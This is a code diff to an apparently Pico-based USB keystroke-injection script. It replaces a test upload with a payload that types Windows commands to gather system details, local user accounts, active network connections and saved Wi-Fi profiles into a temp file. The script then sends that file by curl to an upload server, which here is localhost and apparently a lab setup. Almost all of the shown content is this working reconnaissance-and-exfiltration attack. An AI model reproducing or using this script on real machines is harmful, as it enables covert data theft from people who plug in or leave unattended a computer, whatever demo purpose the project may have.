@@ -93,24 +93,34 @@ def pdf_download_and_open(kbd, layout):
 
 def import_data_on_website(kbd, layout):
     WEB_UPLOAD_URL = "http://127.0.0.1:5000/upload"
-    TXT_FILENAME = "m.txt"
-    TXT_CONTENT = "Test Pico HID"
-    command = (
-        "cmd /c cd /d %TEMP%&&echo "
-        + TXT_CONTENT
-        + ">"
-        + TXT_FILENAME
-        + '&&curl -F "file=@'
-        + TXT_FILENAME
-        + '" '
-        + WEB_UPLOAD_URL
-    )
+    REPORT_PATH = "%TEMP%\\rapport_demo.txt"
 
-    kbd.send(Keycode.GUI, Keycode.R)
-    time.sleep(0.3)
-    layout.write(command)
-    kbd.send(Keycode.ENTER)
-    time.sleep(1.0)
+    def run_cmd(command, wait=1.0):
+        kbd.send(Keycode.GUI, Keycode.R)
+        time.sleep(0.3)
+        layout.write("cmd /c " + command)
+        kbd.send(Keycode.ENTER)
+        time.sleep(wait)
+
+    run_cmd("type nul > " + REPORT_PATH)
+    run_cmd("(echo [SYSTEME]) >> " + REPORT_PATH)
+    run_cmd(
+        'systeminfo | findstr /C:"Nom de l" /C:"OS Name" /C:"OS Version" /C:"BIOS Version" /C:"Domain" >> '
+        + REPORT_PATH,
+        wait=6.0,
+    )
+    run_cmd("(echo.) >> " + REPORT_PATH)
+    run_cmd("(echo [UTILISATEURS LOCAUX]) >> " + REPORT_PATH)
+    run_cmd("net user >> " + REPORT_PATH)
+    run_cmd("(echo.) >> " + REPORT_PATH)
+    run_cmd("(echo [CONNEXIONS RESEAU ACTIVES]) >> " + REPORT_PATH)
+    run_cmd("netstat -an | findstr ESTABLISHED >> " + REPORT_PATH, wait=2.0)
+    run_cmd("(echo.) >> " + REPORT_PATH)
+    run_cmd("(echo [PROFILS WIFI ENREGISTRES]) >> " + REPORT_PATH)
+    run_cmd("netsh wlan show profiles >> " + REPORT_PATH, wait=2.0)
+
+
+    run_cmd('curl -F "file=@' + REPORT_PATH + '" ' + WEB_UPLOAD_URL, wait=3.0)
 
 
 # Attend l'initialisation USB, puis execute les actions associees aux GPIO actifs.
